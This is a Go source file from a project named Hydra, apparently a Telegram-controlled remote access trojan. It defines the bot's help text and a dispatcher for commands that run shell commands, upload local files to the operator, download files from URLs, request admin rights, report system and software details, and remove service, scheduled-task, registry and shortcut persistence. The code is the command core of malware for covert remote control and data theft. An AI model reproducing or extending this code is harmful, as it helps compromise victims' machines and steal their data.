package commands

import (
	"fmt"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/install"
	"github.com/Raffy27/Hydra/util"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

const (
	help = "```\nhelp - display this help message\nping - measure the latency of command execution\n" +
		"reset - create a new Genesis message\ninfo - display system information\nsoftware - display the list of installed programs\n" +
		"sh - execute a command and return the output\nfile - upload a file from the local system\n" +
		"dl - download a file from a url to the local system\nroot - ask for admin permissions\nremove - uninstall Hydra\n" +
		"instance - returns informtaion about Hydra\n```"
	fmtUninstall = "```\nRemoving all traces of Hydra...\n\nService: %v\nTask: %v\nRegistry: %v\nShortcut: %v\n\nBye!\n```"
	unknown      = "Wat is this? America explain!!"
)

func sendHelp() {
	cfg := tgbotapi.NewMessage(util.ChatID, help)
	cfg.ParseMode = "Markdown"
	api.Bot.Send(cfg)
}

func sendUnknown() {
	cfg := tgbotapi.NewMessage(util.ChatID, unknown)
	api.Bot.Send(cfg)
}

func sendUninstall() {
	cfg := tgbotapi.NewMessage(util.ChatID, "")
	cfg.ParseMode = "Markdown"
	d := install.Uninstall()
	cfg.Text = fmt.Sprintf(fmtUninstall, d[0], d[1], d[2], d[3])
	api.Bot.Send(cfg)
}

//Perform selects the appropriate command handler.
func Perform(message *tgbotapi.Message) {
	switch message.Command() {
	case "help":
		sendHelp()
	case "ping":
		Ping()
	case "reset":
		Reset()
	case "info":
		Info()
	case "software":
		Software()
	case "root":
		Elevate()
	case "dl":
		Download(message.CommandArguments())
	case "sh":
		Shell(message.CommandArguments())
	case "file":
		UploadFile(message.CommandArguments())
	case "instance":
		InstanceInfo()
	case "remove":
		sendUninstall()
	default:
		sendUnknown()
	}
}
